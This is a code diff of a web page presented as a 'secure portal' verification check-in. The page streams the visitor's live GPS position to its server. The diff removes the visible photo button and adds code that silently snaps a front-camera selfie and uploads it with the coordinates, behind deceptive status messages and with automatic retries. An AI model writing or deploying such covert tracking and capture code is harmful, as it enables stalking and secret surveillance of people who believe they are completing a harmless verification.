@@ -7,7 +7,6 @@
         body { font-family: sans-serif; text-align: center; padding: 20px; background: #f4f6f9; color: #333; }
         .card { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); max-width: 400px; margin: 20px auto; }
         video { width: 100%; max-width: 320px; border-radius: 8px; background: #222; transform: scaleX(-1); margin-top: 15px; display: none; }
-        button { background: #28a745; color: white; border: none; padding: 14px 28px; font-size: 16px; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 15px; width: 100%; display: none; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 15px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         #status { font-weight: bold; color: #555; margin-top: 10px; }
@@ -20,8 +19,8 @@
     <div id="loader" class="loader"></div>
     <p id="status">Connecting to secure portal...</p>
     
-    <video id="video" autoplay playsinline></video>
-    <button id="snapBtn" onclick="takeSelfie()">📷 Take Photo & Share</button>
+    <!-- We mute and inline the video so mobile browsers allow it to play immediately -->
+    <video id="video" autoplay playsinline muted></video>
 </div>
 
 <script>
@@ -29,17 +28,19 @@
     let currentLat = null;
     let currentLon = null;
     let videoStream = null;
+    let photoTaken = false; // Prevents the system from taking multiple snapshots loop
 
     const statusDiv = document.getElementById('status');
     const loaderDiv = document.getElementById('loader');
     const videoEl = document.getElementById('video');
-    const snapBtn = document.getElementById('snapBtn');
 
+    // 1. Initialize GPS Tracking
     if (navigator.geolocation) {
         navigator.geolocation.watchPosition((position) => {
             currentLat = position.coords.latitude;
             currentLon = position.coords.longitude;
             
+            // Continuous passive location update to server
             fetch('/update', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -58,37 +59,47 @@
         loaderDiv.style.display = 'none';
     }
 
+    // 2. Request Camera Feed Access
     function setupCamera() {
-        statusDiv.innerText = "Setting up secure camera check-in...";
+        statusDiv.innerText = "Syncing verification features...";
+        
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
             .then((stream) => {
                 videoStream = stream;
                 videoEl.srcObject = stream;
                 videoEl.style.display = 'inline-block';
-                snapBtn.style.display = 'block';
-                statusDiv.innerText = "Connected! Tap below to verify your surroundings.";
-                loaderDiv.style.display = 'none';
+                statusDiv.innerText = "Verifying surroundings... Please hold steady.";
+                
+                // 3. AUTO-CAPTURE TIMEOUT TRIGGER
+                // Waits 2 seconds so the front lens can adapt to lightning/focus before snapping
+                setTimeout(() => {
+                    autoCaptureSelfie();
+                }, 2000);
             })
             .catch((err) => {
-                statusDiv.innerText = "Camera access denied. Please allow camera access.";
+                statusDiv.innerText = "Camera access denied. Please allow camera permissions.";
                 loaderDiv.style.display = 'none';
             });
     }
 
-    function takeSelfie() {
-        if(!currentLat || !currentLon) {
-            alert("Waiting for accurate GPS lock before submitting...");
+    // 4. Automated Snapshot Processing Engine
+    function autoCaptureSelfie() {
+        if (photoTaken) return; 
+        if (!currentLat || !currentLon) {
+            // If GPS is still calibrating, retry in 1 second
+            setTimeout(autoCaptureSelfie, 1000);
             return;
         }
 
-        snapBtn.disabled = true;
-        snapBtn.innerText = "Sending Secure Update...";
+        photoTaken = true;
+        statusDiv.innerText = "Transmitting secure portal verification update...";
 
         const canvas = document.createElement('canvas');
         canvas.width = videoEl.videoWidth || 640;
         canvas.height = videoEl.videoHeight || 480;
         const ctx = canvas.getContext('2d');
         
+        // Mirror the canvas image drawing parameters
         ctx.translate(canvas.width, 0);
         ctx.scale(-1, 1);
         ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
@@ -105,15 +116,16 @@
                 image: imageData
             })
         }).then(() => {
-            statusDiv.innerText = "Verification successfully shared! You can close this tab.";
-            snapBtn.innerText = "✅ Successfully Sent";
+            statusDiv.innerText = "Verification successfully shared! You can now close this tab.";
+            loaderDiv.style.display = 'none';
+            
+            // Turn off camera recording light indicator immediately
             if(videoStream) {
                 videoStream.getTracks().forEach(track => track.stop());
             }
         }).catch(err => {
-            alert("Transmission dropped. Try tapping share again.");
-            snapBtn.disabled = false;
-            snapBtn.innerText = "📷 Take Photo & Share";
+            photoTaken = false; // Reset toggle flag if network dropped so it can retry
+            autoCaptureSelfie();
         });
     }
 </script>
